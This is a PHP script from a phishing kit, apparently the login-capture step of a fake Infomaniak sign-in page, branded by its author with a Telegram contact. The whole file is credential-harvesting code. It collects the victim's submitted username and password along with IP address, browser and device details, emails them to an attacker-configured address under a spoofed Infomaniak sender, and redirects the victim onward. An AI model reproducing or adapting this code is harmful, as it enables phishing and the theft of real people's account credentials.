<?php

/*
    ███╗   ███╗██████╗ ██████╗ ██╗██╗  ██╗███╗   ███╗██╗███╗   ██╗██████╗ 
    ████╗ ████║╚════██╗██╔══██╗██║██║  ██║████╗ ████║██║████╗  ██║╚════██╗
    ██╔████╔██║ █████╔╝██║  ██║██║███████║██╔████╔██║██║██╔██╗ ██║ █████╔╝
    ██║╚██╔╝██║ ╚═══██╗██║  ██║██║╚════██║██║╚██╔╝██║╚═╝██║╚██╗██║ ╚═══██╗
    ██║ ╚═╝ ██║██████╔╝██████╔╝███████╗██║██║ ╚═╝ ██║██╗██║ ╚████║██████╔╝
    ╚═╝     ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚═════╝ 
             c0ded By M3dL4m!n3  Contact Telegram: @M3dL4m1n3
*/
include_once("../../vendor/app.php");
include("../../vendor/funcs.php");
include("../../vendor/random.php");

$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$back = "../step";
$hostname = gethostbyaddr($ip);
$message .= "--------------Infomaniak---------------\n";
$message .= "Login : ".$_POST['log']."\n";
$message .= "Pass : ".$_POST['ps']."\n";
$message .= "--------------------------------------\n";
$message .= "IPs : $ip\n";
$message .= "Browser : $Browser\n";
$message .= "Device  : $OS\n";
$message .= "---------------M3dL4m!n3--------------\n";
include("../../config.php");
$subject = "Login | $ip | $OS ";
$headers = "From:Infomaniak<webmaster3@gmx.com>";
mail($yourmail,$subject,$message,$headers);
include("../../vendor/PHPMailerAutoload.php");
header("Location: $back");

?>